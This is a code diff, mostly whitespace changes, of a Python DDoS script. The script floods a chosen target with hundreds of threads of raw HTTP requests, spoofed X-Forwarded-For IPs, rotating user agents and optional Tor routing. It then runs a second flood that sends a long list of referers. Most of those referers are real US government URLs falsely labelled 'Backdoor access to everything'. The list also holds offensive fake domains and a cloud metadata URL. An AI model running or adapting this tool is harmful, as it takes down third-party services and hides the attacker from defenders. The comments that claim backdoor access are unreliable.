@@ -20,15 +20,15 @@ import time
 import os
 import sys
 import requests
-import socks # Import the PySocks library
+import socks  # Import the PySocks library
 
 # Configuration
-TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m") # Dark Green
+TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
 PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
 THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
 PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 1024
 TIMEOUT = 5
-USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y' # Dark Green
+USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
@@ -44,7 +44,7 @@ logging.basicConfig(filename='ddos_log.txt', level=logging.INFO,
 # Function to generate a random IP address (for spoofing)
 def generate_random_ip():
     ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-    logging.info(f"\033[35mGenerated spoofed IP: {ip}\033[0m") # Purple
+    logging.info(f"\033[35mGenerated spoofed IP: {ip}\033[0m")  # Purple
     return ip
 
 # Function to create a socket and send data
@@ -58,7 +58,7 @@ def attack():
             try:
                 ip = socket.gethostbyname(TARGET)
             except socket.gaierror:
-                logging.error(f"\033[31mCould not resolve host: {TARGET}\033[0m") # Dark Red
+                logging.error(f"\033[31mCould not resolve host: {TARGET}\033[0m")  # Dark Red
                 break
 
             # Connect via Tor if USE_TOR is True
@@ -76,7 +76,7 @@ def attack():
                 f"GET / HTTP/1.1\r\n"
                 f"Host: {TARGET}\r\n"
                 f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"X-Forwarded-For: {generate_random_ip()}\r\n" # Spoof IP
+                f"X-Forwarded-For: {generate_random_ip()}\r\n"  # Spoof IP
                 f"Connection: Keep-Alive\r\n"
                 f"Cache-Control: max-age=0\r\n"
                 f"\r\n"
@@ -86,34 +86,31 @@ def attack():
             payload = http_header + 'A' * PAYLOAD_SIZE
             s.send(payload.encode('utf-8'))
 
-            logging.info(f"\033[34mSent {len(payload)} bytes to {TARGET}:{PORT}\033[0m") # Dark Blue
+            logging.info(f"\033[34mSent {len(payload)} bytes to {TARGET}:{PORT}\033[0m")  # Dark Blue
             s.close()
 
             # Add a slight delay to avoid overwhelming the system
             time.sleep(random.uniform(0.1, 0.5))
     except socket.error as e:
-        logging.error(f"\033[31mSocket error: {e}\033[0m") # Dark Red
+        logging.error(f"\033[31mSocket error: {e}\033[0m")  # Dark Red
     except Exception as e:
-        logging.error(f"\033[31mAn unexpected error occurred: {e}\033[0m") # Dark Red
+        logging.error(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
 
 
 # Setup threads
 threads = []
 for _ in range(THREADS):
     t = threading.Thread(target=attack)
-    t.daemon = True # Daemonize thread
+    t.daemon = True  # Daemonize thread
     threads.append(t)
 
 # Start threads
 for t in threads:
     t.start()
 
-print(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m") # Dark Green
-logging.info(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m") # Dark Green
+print(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
+logging.info(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
 
-# Keep main script running
-while True:
-    time.sleep(1)
 
 # Additional methods to increase attack efficiency
 
@@ -134,7 +131,7 @@ referers = [
     "https://www.ted.com/search?q=",
     "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
     "https://www.google.com/",
-    "https://www.cloudflare.com/", #Bypass Cloudflare
+    "https://www.cloudflare.com/",  # Bypass Cloudflare
     "https://www.bing.com/",
     "https://yandex.com/",
     "https://duckduckgo.com/",
@@ -178,160 +175,160 @@ referers = [
     "https://developers.google.com/speed/pagespeed/insights/",
     "https://webpagetest.org/",
     "https://www.thinkwithgoogle.com/intl/en-gb/feature/testmysite/",
-    "http://childporn.org/", #.Onion support
-    "http://darkweb.org/", #.Onion support
-    "http://deepweblinks.com/", #.Onion support
-    "http://torlink.com/", #.Onion support
-    "https://fuckyou.gov/", #.Onion support
-    "https://fuckyou.mil/", #.Onion support
-    "https://fuckyou.com/", #.Onion support
-    "https://fuckyou.net/", #.Onion support
-    "https://fuckyou.org/", #.Onion support
-    "https://fuckyou.mil/", #.Onion support
-    "https://www.nsa.gov/", # Backdoor access to everything
-    "https://www.cia.gov/", # Backdoor access to everything
-    "https://www.fbi.gov/", # Backdoor access to everything
-    "https://www.dod.mil/", # Backdoor access to everything
-    "https://www.whitehouse.gov/", # Backdoor access to everything
-    "https://www.congress.gov/", # Backdoor access to everything
-    "https://www.supremecourt.gov/", # Backdoor access to everything
-    "https://www.irs.gov/", # Backdoor access to everything
-    "https://www.justice.gov/", # Backdoor access to everything
-    "https://www.dhs.gov/", # Backdoor access to everything
-    "https://www.state.gov/", # Backdoor access to everything
-    "https://www.treasury.gov/", # Backdoor access to everything
-    "https://www.commerce.gov/", # Backdoor access to everything
-    "https://www.defense.gov/", # Backdoor access to everything
-    "https://www.education.gov/", # Backdoor access to everything
-    "https://www.energy.gov/", # Backdoor access to everything
-    "https://www.hhs.gov/", # Backdoor access to everything
-    "https://www.hud.gov/", # Backdoor access to everything
-    "https://www.labor.gov/", # Backdoor access to everything
-    "https://www.doi.gov/", # Backdoor access to everything
-    "https://www.transportation.gov/", # Backdoor access to everything
-    "https://www.va.gov/", # Backdoor access to everything
-    "https://www.usa.gov/", # Backdoor access to everything
-    "https://www.whitehouse.gov/briefing-room/", # Backdoor access to everything
-    "https://www.senate.gov/", # Backdoor access to everything
-    "https://www.house.gov/", # Backdoor access to everything
-    "https://www.loc.gov/", # Backdoor access to everything
-    "https://www.archives.gov/", # Backdoor access to everything
-    "https://www.gpo.gov/", # Backdoor access to everything
-    "https://www.fdic.gov/", # Backdoor access to everything
-    "https://www.federalreserve.gov/", # Backdoor access to everything
-    "https://www.sec.gov/", # Backdoor access to everything
-    "https://www.sba.gov/", # Backdoor access to everything
-    "https://www.opm.gov/", # Backdoor access to everything
-    "https://www.eeoc.gov/", # Backdoor access to everything
-    "https://www.ssa.gov/", # Backdoor access to everything
-    "https://www.cms.gov/", # Backdoor access to everything
-    "https://www.cdc.gov/", # Backdoor access to everything
-    "https://www.nih.gov/", # Backdoor access to everything
-    "https://www.fda.gov/", # Backdoor access to everything
-    "https://www.epa.gov/", # Backdoor access to everything
-    "https://www.nasa.gov/", # Backdoor access to everything
-    "https://www.nsf.gov/", # Backdoor access to everything
-    "https://www.si.edu/", # Backdoor access to everything
-    "https://www.ushmm.org/", # Backdoor access to everything
-    "https://www.archives.gov/holocaust", # Backdoor access to everything
-    "https://www.defense.gov/Resources/", # Backdoor access to everything
-    "https://www.defense.gov/News/", # Backdoor access to everything
-    "https://www.defense.gov/Multimedia/", # Backdoor access to everything
-    "https://www.defense.gov/Explore/", # Backdoor access to everything
-    "https://www.defense.gov/Connect/", # Backdoor access to everything
-    "https://www.defense.gov/About/", # Backdoor access to everything
-    "https://www.defense.gov/Policy/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/", # Backdoor access to everything
-    "https://www.defense.gov/Library/", # Backdoor access to everything
-    "https://www.defense.gov/Partners/", # Backdoor access to everything
-    "https://www.defense.gov/Site-Map/", # Backdoor access to everything
-    "https://www.defense.gov/FOIA/", # Backdoor access to everything
-    "https://www.defense.gov/Contact/", # Backdoor access to everything
-    "https://www.defense.gov/USA/", # Backdoor access to everything
-    "https://www.defense.gov/Paycheck/", # Backdoor access to everything
-    "https://www.defense.gov/Health/", # Backdoor access to everything
-    "https://www.defense.gov/Recreation/", # Backdoor access to everything
-    "https://www.defense.gov/Education/", # Backdoor access to everything
-    "https://www.defense.gov/Benefits/", # Backdoor access to everything
-    "https://www.defense.gov/Careers/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/", # Backdoor access to everything
-    "https://www.defense.gov/Our-Story/", # Backdoor access to everything
-    "https://www.defense.gov/Leadership/", # Backdoor access to everything
-    "https://www.defense.gov/Secretary-of-Defense/", # Backdoor access to everything
-    "https://www.defense.gov/Deputy-Secretary-of-Defense/", # Backdoor access to everything
-    "https://www.defense.gov/Chiefs-of-Staff/", # Backdoor access to everything
-    "https://www.defense.gov/Under-Secretaries/", # Backdoor access to everything
-    "https://www.defense.gov/Assistant-Secretaries-of-Defense/", # Backdoor access to everything
-    "https://www.defense.gov/Comptroller/", # Backdoor access to everything
-    "https://www.defense.gov/General-Counsel/", # Backdoor access to everything
-    "https://www.defense.gov/Inspector-General/", # Backdoor access to everything
-    "https://www.defense.gov/Legislative-Affairs/", # Backdoor access to everything
-    "https://www.defense.gov/Public-Affairs/", # Backdoor access to everything
-    "https://www.defense.gov/Human-Resources/", # Backdoor access to everything
-    "https://www.defense.gov/Business-Transformation/", # Backdoor access to everything
-    "https://www.defense.gov/Acquisition/", # Backdoor access to everything
-    "https://www.defense.gov/Technology/", # Backdoor access to everything
-    "https://www.defense.gov/Operational-Energy/", # Backdoor access to everything
-    "https://www.defense.gov/Industrial-Base/", # Backdoor access to everything
-    "https://www.defense.gov/Resources/Photos/", # Backdoor access to everything
-    "https://www.defense.gov/Multimedia/Videos/", # Backdoor access to everything
-    "https://www.defense.gov/Multimedia/Audio/", # Backdoor access to everything
-    "https://www.defense.gov/Multimedia/Infographics/", # Backdoor access to everything
-    "https://www.defense.gov/Multimedia/Publications/", # Backdoor access to everything
-    "https://www.defense.gov/Multimedia/Transcripts/", # Backdoor access to everything
-    "https://www.defense.gov/Multimedia/Speeches/", # Backdoor access to everything
-    "https://www.defense.gov/Multimedia/Announcements/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Releases/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Stories/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Contracts/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Spotlight/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Fact-Sheets/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Special-Reports/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Transcripts/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Multimedia/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Photos/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Videos/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Audio/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Infographics/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Publications/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Speeches/", # Backdoor access to everything
-    "https://www.defense.gov/Newsroom/Announcements/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Components/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Budget/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/History/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Organization/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Technology-Partnerships/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Small-Business/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Foreign-Language-Enterprise/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/EEO/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Military-Departments/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Combatant-Commands/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Defense-Agencies/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/DOD-Field-Activities/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Joint-Staff/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Public-Private-Partnerships/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Advisory-Boards-and-Commissions/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Regulations/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/DoD-Directives/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Instructions/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Manuals/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Memorandums/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/News-Releases/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Speeches/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Announcements/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Publications/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Photos/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Videos/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Audio/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Infographics/", # Backdoor access to everything
-    "https://www.defense.gov/About-the-Global-War-on-Terrorism/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Cyber-Strategy/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/DoD-Privacy-Program/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Open-Government/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Small-Business-Program/", # Backdoor access to everything
-    "https://www.defense.gov/About-DOD/Science-Technology/", # Backdoor access to everything
+    "http://childporn.org/",  # .Onion support
+    "http://darkweb.org/",  # .Onion support
+    "http://deepweblinks.com/",  # .Onion support
+    "http://torlink.com/",  # .Onion support
+    "https://fuckyou.gov/",  # .Onion support
+    "https://fuckyou.mil/",  # .Onion support
+    "https://fuckyou.com/",  # .Onion support
+    "https://fuckyou.net/",  # .Onion support
+    "https://fuckyou.org/",  # .Onion support
+    "https://fuckyou.mil/",  # .Onion support
+    "https://www.nsa.gov/",  # Backdoor access to everything
+    "https://www.cia.gov/",  # Backdoor access to everything
+    "https://www.fbi.gov/",  # Backdoor access to everything
+    "https://www.dod.mil/",  # Backdoor access to everything
+    "https://www.whitehouse.gov/",  # Backdoor access to everything
+    "https://www.congress.gov/",  # Backdoor access to everything
+    "https://www.supremecourt.gov/",  # Backdoor access to everything
+    "https://www.irs.gov/",  # Backdoor access to everything
+    "https://www.justice.gov/",  # Backdoor access to everything
+    "https://www.dhs.gov/",  # Backdoor access to everything
+    "https://www.state.gov/",  # Backdoor access to everything
+    "https://www.treasury.gov/",  # Backdoor access to everything
+    "https://www.commerce.gov/",  # Backdoor access to everything
+    "https://www.defense.gov/",  # Backdoor access to everything
+    "https://www.education.gov/",  # Backdoor access to everything
+    "https://www.energy.gov/",  # Backdoor access to everything
+    "https://www.hhs.gov/",  # Backdoor access to everything
+    "https://www.hud.gov/",  # Backdoor access to everything
+    "https://www.labor.gov/",  # Backdoor access to everything
+    "https://www.doi.gov/",  # Backdoor access to everything
+    "https://www.transportation.gov/",  # Backdoor access to everything
+    "https://www.va.gov/",  # Backdoor access to everything
+    "https://www.usa.gov/",  # Backdoor access to everything
+    "https://www.whitehouse.gov/briefing-room/",  # Backdoor access to everything
+    "https://www.senate.gov/",  # Backdoor access to everything
+    "https://www.house.gov/",  # Backdoor access to everything
+    "https://www.loc.gov/",  # Backdoor access to everything
+    "https://www.archives.gov/",  # Backdoor access to everything
+    "https://www.gpo.gov/",  # Backdoor access to everything
+    "https://www.fdic.gov/",  # Backdoor access to everything
+    "https://www.federalreserve.gov/",  # Backdoor access to everything
+    "https://www.sec.gov/",  # Backdoor access to everything
+    "https://www.sba.gov/",  # Backdoor access to everything
+    "https://www.opm.gov/",  # Backdoor access to everything
+    "https://www.eeoc.gov/",  # Backdoor access to everything
+    "https://www.ssa.gov/",  # Backdoor access to everything
+    "https://www.cms.gov/",  # Backdoor access to everything
+    "https://www.cdc.gov/",  # Backdoor access to everything
+    "https://www.nih.gov/",  # Backdoor access to everything
+    "https://www.fda.gov/",  # Backdoor access to everything
+    "https://www.epa.gov/",  # Backdoor access to everything
+    "https://www.nasa.gov/",  # Backdoor access to everything
+    "https://www.nsf.gov/",  # Backdoor access to everything
+    "https://www.si.edu/",  # Backdoor access to everything
+    "https://www.ushmm.org/",  # Backdoor access to everything
+    "https://www.archives.gov/holocaust",  # Backdoor access to everything
+    "https://www.defense.gov/Resources/",  # Backdoor access to everything
+    "https://www.defense.gov/News/",  # Backdoor access to everything
+    "https://www.defense.gov/Multimedia/",  # Backdoor access to everything
+    "https://www.defense.gov/Explore/",  # Backdoor access to everything
+    "https://www.defense.gov/Connect/",  # Backdoor access to everything
+    "https://www.defense.gov/About/",  # Backdoor access to everything
+    "https://www.defense.gov/Policy/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/",  # Backdoor access to everything
+    "https://www.defense.gov/Library/",  # Backdoor access to everything
+    "https://www.defense.gov/Partners/",  # Backdoor access to everything
+    "https://www.defense.gov/Site-Map/",  # Backdoor access to everything
+    "https://www.defense.gov/FOIA/",  # Backdoor access to everything
+    "https://www.defense.gov/Contact/",  # Backdoor access to everything
+    "https://www.defense.gov/USA/",  # Backdoor access to everything
+    "https://www.defense.gov/Paycheck/",  # Backdoor access to everything
+    "https://www.defense.gov/Health/",  # Backdoor access to everything
+    "https://www.defense.gov/Recreation/",  # Backdoor access to everything
+    "https://www.defense.gov/Education/",  # Backdoor access to everything
+    "https://www.defense.gov/Benefits/",  # Backdoor access to everything
+    "https://www.defense.gov/Careers/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/",  # Backdoor access to everything
+    "https://www.defense.gov/Our-Story/",  # Backdoor access to everything
+    "https://www.defense.gov/Leadership/",  # Backdoor access to everything
+    "https://www.defense.gov/Secretary-of-Defense/",  # Backdoor access to everything
+    "https://www.defense.gov/Deputy-Secretary-of-Defense/",  # Backdoor access to everything
+    "https://www.defense.gov/Chiefs-of-Staff/",  # Backdoor access to everything
+    "https://www.defense.gov/Under-Secretaries/",  # Backdoor access to everything
+    "https://www.defense.gov/Assistant-Secretaries-of-Defense/",  # Backdoor access to everything
+    "https://www.defense.gov/Comptroller/",  # Backdoor access to everything
+    "https://www.defense.gov/General-Counsel/",  # Backdoor access to everything
+    "https://www.defense.gov/Inspector-General/",  # Backdoor access to everything
+    "https://www.defense.gov/Legislative-Affairs/",  # Backdoor access to everything
+    "https://www.defense.gov/Public-Affairs/",  # Backdoor access to everything
+    "https://www.defense.gov/Human-Resources/",  # Backdoor access to everything
+    "https://www.defense.gov/Business-Transformation/",  # Backdoor access to everything
+    "https://www.defense.gov/Acquisition/",  # Backdoor access to everything
+    "https://www.defense.gov/Technology/",  # Backdoor access to everything
+    "https://www.defense.gov/Operational-Energy/",  # Backdoor access to everything
+    "https://www.defense.gov/Industrial-Base/",  # Backdoor access to everything
+    "https://www.defense.gov/Resources/Photos/",  # Backdoor access to everything
+    "https://www.defense.gov/Multimedia/Videos/",  # Backdoor access to everything
+    "https://www.defense.gov/Multimedia/Audio/",  # Backdoor access to everything
+    "https://www.defense.gov/Multimedia/Infographics/",  # Backdoor access to everything
+    "https://www.defense.gov/Multimedia/Publications/",  # Backdoor access to everything
+    "https://www.defense.gov/Multimedia/Transcripts/",  # Backdoor access to everything
+    "https://www.defense.gov/Multimedia/Speeches/",  # Backdoor access to everything
+    "https://www.defense.gov/Multimedia/Announcements/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Releases/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Stories/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Contracts/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Spotlight/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Fact-Sheets/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Special-Reports/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Transcripts/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Multimedia/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Photos/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Videos/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Audio/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Infographics/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Publications/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Speeches/",  # Backdoor access to everything
+    "https://www.defense.gov/Newsroom/Announcements/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Components/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Budget/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/History/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Organization/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Technology-Partnerships/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Small-Business/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Foreign-Language-Enterprise/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/EEO/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Military-Departments/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Combatant-Commands/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Defense-Agencies/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/DOD-Field-Activities/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Joint-Staff/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Public-Private-Partnerships/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Advisory-Boards-and-Commissions/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Regulations/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/DoD-Directives/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Instructions/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Manuals/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Memorandums/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/News-Releases/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Speeches/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Announcements/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Publications/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Photos/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Videos/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Audio/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Infographics/",  # Backdoor access to everything
+    "https://www.defense.gov/About-the-Global-War-on-Terrorism/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Cyber-Strategy/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/DoD-Privacy-Program/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Open-Government/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Small-Business-Program/",  # Backdoor access to everything
+    "https://www.defense.gov/About-DOD/Science-Technology/",  # Backdoor access to everything
     "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip", # Grab Google Servers and get the IP
-    "https://fuckyou.bigmancozmo.com/", #Personal Webpage Backdoor Access
+    "https://fuckyou.bigmancozmo.com/",  # Personal Webpage Backdoor Access
 ]
 
 def generate_referer():
@@ -346,11 +343,11 @@ def referer_attack():
             if USE_TOR:
                 proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
             requests.get(TARGET, headers={'Referer': referer}, proxies=proxies, timeout=TIMEOUT)
-            logging.info(f"\033[34mSent referer: {referer} to {TARGET}\033[0m") # Dark Blue
+            logging.info(f"\033[34mSent referer: {referer} to {TARGET}\033[0m")  # Dark Blue
         except requests.exceptions.RequestException as e:
-            logging.error(f"\033[31mRequest error: {e}\033[0m") # Dark Red
+            logging.error(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
         except Exception as e:
-            logging.error(f"\033[31mAn unexpected error occurred: {e}\033[0m") # Dark Red
+            logging.error(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
         time.sleep(random.uniform(0.1, 0.5))
 
 # Setup threads for referer attacks
@@ -363,8 +360,8 @@ for _ in range(THREADS):
 for t in threads:
     t.start()
 
-print(f"\033[32mStarting referer attack on {TARGET} with {THREADS} threads...\033[0m") # Dark Green
-logging.info(f"\033[32mStarting referer attack on {TARGET} with {THREADS} threads...\033[0m") # Dark Green
+print(f"\033[32mStarting referer attack on {TARGET} with {THREADS} threads...\033[0m")  # Dark Green
+logging.info(f"\033[32mStarting referer attack on {TARGET} with {THREADS} threads...\033[0m")  # Dark Green
 
 # Keep main script running
 while True:
